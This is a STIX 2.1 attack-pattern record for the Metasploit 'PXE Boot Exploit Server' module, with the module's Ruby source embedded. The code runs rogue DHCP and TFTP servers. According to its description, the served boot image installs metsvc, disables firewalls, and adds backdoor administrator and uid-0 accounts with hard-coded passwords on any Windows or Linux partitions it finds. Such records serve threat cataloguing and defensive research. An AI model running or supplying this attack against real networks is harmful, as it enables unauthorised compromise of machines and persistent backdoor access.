{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--720fd553-a355-4455-b475-9aac39d482bc",
    "created": "2024-08-14T16:21:58.067818Z",
    "modified": "2024-08-14T16:21:58.067822Z",
    "name": "PXE Boot Exploit Server",
    "description": " This module provides a PXE server, running a DHCP and TFTP server. The default configuration loads a linux kernel and initrd into memory that reads the hard drive; placing a payload to install metsvc, disable the firewall, and add a new user metasploit on any Windows partition seen and add a uid 0 user with username and password metasploit to any linux partition seen. The windows user will have the password p@SSw0rd!123456 (in case of complexity requirements) and will be added to the administrators group.  Note: the displayed IP address of a target is the address this DHCP server handed out, not the \"normal\" IP address the host uses. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/pxeexploit.rb",
            "external_id": "pxeexploit.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TFTPServer\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'PXE Boot Exploit Server',\n      'Description'    => %q{\n        This module provides a PXE server, running a DHCP and TFTP server.\n        The default configuration loads a linux kernel and initrd into memory that\n        reads the hard drive; placing a payload to install metsvc, disable the\n        firewall, and add a new user metasploit on any Windows partition seen,\n        and add a uid 0 user with username and password metasploit to any linux\n        partition seen. The windows user will have the password p@SSw0rd!123456\n        (in case of complexity requirements) and will be added to the administrators\n        group.\n\n        Note: the displayed IP address of a target is the address this DHCP server\n        handed out, not the \"normal\" IP address the host uses.\n      },\n      'Author'      => [ 'scriptjunkie' ],\n      'License'     => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'Service', 'Description' => 'Run PXE server' ]\n        ],\n      'PassiveActions' =>\n        [\n          'Service'\n        ],\n      'DefaultAction'  => 'Service',\n      'DefaultOptions' => {\n        'FILENAME' => 'update1',\n        'SERVEONCE' => true # once they reboot; don't infect again - you'll kill them!\n      }\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('TFTPROOT',   [ false,  'The TFTP root directory to serve files from',\n          File.join(Msf::Config.data_directory, 'exploits', 'pxexploit')]),\n        OptString.new('SRVHOST',   [ false,  'The IP of the DHCP server' ]),\n        OptString.new('NETMASK',   [ false,  'The netmask of the local subnet', '255.255.255.0' ]),\n        OptString.new('DHCPIPSTART',   [ false,  'The first IP to give out' ]),\n        OptString.new('DHCPIPEND',   [ false,  'The last IP to give out' ])\n      ])\n  end\n\n  def run\n    print_status(\"Starting TFTP server...\")\n    @tftp = Rex::Proto::TFTP::Server.new\n    @tftp.set_tftproot(datastore['TFTPROOT'])\n    @tftp.start\n    add_socket(@tftp.sock)\n\n    print_status(\"Starting DHCP server...\")\n    @dhcp = Rex::Proto::DHCP::Server.new( datastore )\n    @dhcp.report do |mac, ip|\n      print_status(\"Serving PXE attack to #{mac.unpack('H2H2H2H2H2H2').join(':')} \"+\n          \"(#{Rex::Socket.addr_ntoa(ip)})\")\n      report_note(\n        :type => 'PXE.client',\n        :data => mac.unpack('H2H2H2H2H2H2').join(':')\n      )\n    end\n    @dhcp.start\n    add_socket(@dhcp.sock)\n\n    # Wait for finish..\n    @tftp.thread.join\n    @dhcp.thread.join\n\n  end\nend\n"
}